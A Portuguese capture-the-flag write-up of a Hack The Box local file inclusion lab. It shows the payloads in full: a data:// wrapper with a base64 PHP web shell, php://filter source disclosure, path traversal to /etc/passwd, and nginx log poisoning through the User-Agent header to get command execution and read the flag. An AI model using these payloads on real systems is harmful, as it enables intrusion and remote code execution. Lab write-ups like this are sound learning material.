## 1. Exploração:
Ao entrar no site a primeira coisa que fiz, foi olhar as páginas onde um usuário comum 
poderia acessar, notei que a aba da direita levava até 3 páginas com o diretório 
"index.php?page=.." que costuma ser vulnerável a alguns tipos de ataques, mas além disso, 
a página de contatos tinha algo muito interessante que eu não consegui aproveitar.
Ao digitar sua mensagem na parte do chat, ela iria diretamente para a URL, por 
exemplo ao digitar a mensagem “Bom dia amigos”, retornaríamos ao site principal com a 
seguinte URL:
```
“http://159.65.52.96:31749/index.php?message=Bom+dia+amigos#”
```
Já tendo duas oportunidades de “exploitar” o site, decidi ir para uma abordagem 
mais agressiva.

## 2. Contatos:
Vendo essa página dos contatos, tentei utilizar um php wrapper, para injetar um código 
malicioso:
```
“http://159.65.52.96:31749/index.php?message=
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&
cmd=id”
```
Infelizmente isso acabou não levando a nada, mas é algo que vale a pena investigar, 
já que pode ser uma outra vulnerabilidade não explorada.

## 3. Primeiros Fuzzes:
Voltando para as páginas “index.php?page=..”, decidi realizar 2 tipos de fuzz, o primeiro 
"index.php?page=FUZZ" utilizando LFI-Jhaddix.txt, não consegui nada de relevante, então 
no segundo "index.php?FUZZ=value" utilizando burp-parameter-names.txt, novamente não 
consegui nada, então deveria pensar em uma nova abordagem.

## 4. Cookies e Wrappers:
Já que minha primeira tentativa de Fuzz não havia dado certo, comecei a procurar novas 
possibilidades, e uma delas seria e modificar os cookies para envenenar os logs, para minha 
decepção não consegui encontrar nenhum cookie vulnerável, por fim tentei verificar se a 
opção "allow_url_include" estava ativada ou desativada, infelizmente o site me devolveu 
um "Invalid Input Detected", logo ou era uma versão mais antiga de php, ou poderia ser o 
Nginx ao invés de Apache2, então tentei usando o mesmo e outras versões antigas do php, 
até a 7.0, infelizmente também não deu em nada.

## 5. Imagens:
Um pouco sem ideias, decidi investigar as imagens do site, para ver se a pasta onde 
estavam localizadas tinha alguma vulnerabilidade, então inspecionei o site, e consegui o 
link para a imagem do grande barco do site, ela dava para uma pasta /images/ que estava 
infelizmente protegida, então não consegui acessá-la.

## 6. Voltando ao Fuzz:
Nesse momento meu arsenal intelectual estava no seu limite, e voltei para o curso do HTB, 
para ver se havia algo que eu tinha deixado passar, então foi quando me lembrei do php 
filter.
Nesse caso, precisaria utilizar outro Fuzz para detectar as entidades .php do site, o 
comando usado foi o seguinte:
```
http://159.65.52.96:31749/FUZZ.php
```
Vale ressaltar que a wordlist utilizada foi a small.txt do próprio Kali Linux.
Finalmente tive alguns resultados interessantes, as seguintes palavras bateram:
About Contact Error Index Main
Decidi então utilizar do filtro php para ver se descobria mais coisas com as 5. com o 
seguinte comando:
```
http://159.65.52.96:31749/index.php?page=index.php
```
Para minha felicidade, não deu input inválido, então seria possível ir mais a fundo 
com o próximo comando:
```
http://159.65.52.96:31749/index.php?page=php://filter/read=convert.base64-
encode/resource=index
```
A ideia desse comando é pegar o código convertido na base 64, depois usaremos um 
“echo código | base64 –d" para transformar o código em uma página, tentei em todos 
deixando, para meu azar, o index por último. É nele que eu encontrei uma linha muito 
interessante:
```
// echo '<li><a href="ilf_admin/index.php">Admin</a></li>';
```
## 7. Entrando na sala do admin:
Com a linha de código descoberta, coloquei ela no site, no lugar do index da seguinte 
maneira:
```
http://144.126.206.23:32175/ilf_admin/index.php
```
Nota, vale ressaltar que a partir de agora estou com outro IP já que a máquina havia 
“despwanada” então tive de resetá-la.
Entrei no site e meus níveis de dopamina subiram muito, está aqui uma vulnerabilidade 
bem perigosa para o site, eu poderia ver o chat entre empregados, log de serviço e log do 
sistema.
De qualquer forma, fui analisar o conteúdo dos logs, no chat havia mensagens, antes de 
cada uma delas havia 2 nomes, um deles que terminava em números, e outro que termina 
com números, mas entre colchetes, seriam eles IDs? Ou até mesmo senhas Hard coded? 
Coloquei isso como uma possibilidade e parti para os outros logs.
Nos outros logs havia muitos links e coisas interessantes, mas decidi não as investigar por 
enquanto, então olhei novamente a estrutura do site:
```
http://144.126.206.23:32175/ilf_admin/index.php?log=chat.log
```
Isso mesmo, mais fuzz.

## 8. Fuzz novamente:
Comecei com o primeiro fuzz da seguinte forma:
```
http://144.126.206.23:32175/ilf_admin/index.php?FUZZ=value
```
Nesse caso, utilizei o burp-parameter-names.txt, para tentar encontrar novos 
parâmetros que pudessem ser atacados, ou que me dessem uma nova pista, infelizmente 
não descobri nenhum diretório novo, apenas o próprio log.
Então vamos para outro fuzz, dessa vez com o LFI-Jhaddix.txt da seguinte maneira:
```
http://144.126.206.23:32175/ilf_admin/index.php?log=FUZZ
```
Havia muitas respostas com o tamanho 2046, então utilizei do –fs 2046 para filtrar 
essas respostas com esse tamanho específico, por fim encontrei coisas mais sólidas, vários 
links com o formato similar a esse:
```
../../../../../../../etc/passwd
```
Sem pensar 2 vezes, nem mesmo olhar o resto dos resultados que bateram (estava 
muito animado) fui para o seguinte site:
```
http://144.126.206.23:32175/ilf_admin/index.php?log=../../../../../../../etc/passwd
```
E lá encontrei uma página maravilhosa, e pensei que seria o fim, mas não havia 
nenhum sinal de flag lá, mas tirei informações importantes como que o servidor não 
utilizava do Apache2, mas sim do Nginx, informação importante para buscar paramêtros 
novos, além disso havia um:
```
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
```
Talvez uma dica caso fosse necessário entrar no site com ssh, utilizei também um 
inspect na página para ver se encontrava algo notável, mas encontrei outro beco sem saída, 
voltei e fiz o Fuzz novamente, para ver se não tinha deixado passar outro diretório, e 
encontrei um:
```
../../../../../../../../../../../../etc/hosts
```
Nesse diretório havia informações de ips, e outros elementos que estão fora de meu 
conhecimento por enquanto, sem mais pistas voltei ao HTB para ver se podia ter perdido 
algo novamente.

## 9. Burp e Log Poison:
Era a última esperança, o único que não havia tentado ainda, então seguindo os passos do 
HTB, nota-se que há um arquivo access.log com diretórios diferentes, dependendo se é 
apache ou Nginx, bom, graças a página que acessamos antes, sabemos que é Nginx, então 
utilizando o seguinte diretório chegamos à página dos logs:
```
144.126.206.23:32175/ilf_admin/index.php?log=var/log/nginx/access.log
```
Não deu certo, então, tive de colocar vários “../” até que encontrasse o diretório correto:
```
144.126.206.23:32175/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log
```
Finalmente dentro do access.log, abri o BurpSuite, liguei o intercept e dei refresh na página, 
depois disso, mandei o “proxy” para “Repeater”, e la mudei o User-Agent pra “Veneno” e 
cliquei em send.

## 10. A flag:
Ao checar no response, dava pra ver o “Veneno”, então era possível colocar um script 
malicioso ali e tentar navegar as pastas, logo, no lugar de User-Agent coloquei o seguinte:
```
<?php system($_GET['cmd']); ?>
```
E no get, coloquei um comando, &cmd=id (.../access.log&cmd=id), para minha felicidade 
consegui uma resposta boa:
```
uid=65534(nobody) gid=65534(nobody)
```
Logo era só uma questão de navegar para encontrar a flag, no exercício fala que ela está na 
pasta root, então fazemos um ls / no lugar do id, dessa maneira nos é revelado o que está 
na pasta root, um txt muito interessante: flag_dacc60f2348d.txt.

Por fim, fazemos agora um cat /flag_dacc60f2348d.txt e conseguimos seu conteúdo, que é 
a flag: a9a892dbc9faf9a014f58e007721835e

## 11. Conclusões:
O sistema invadido tem várias vulnerabilidades, mas com meu conhecimento consegui 
explorar poucas delas, vale notar a questão do chat dos Contatos, além dos vários números 
e nomes dos usuários que aparecem no Chat Log, uma sugestão clara que poderá remediar 
o problema, seria a necessidade de colocar uma senha para entrar em qualquer link que 
tenha ilf_admin/
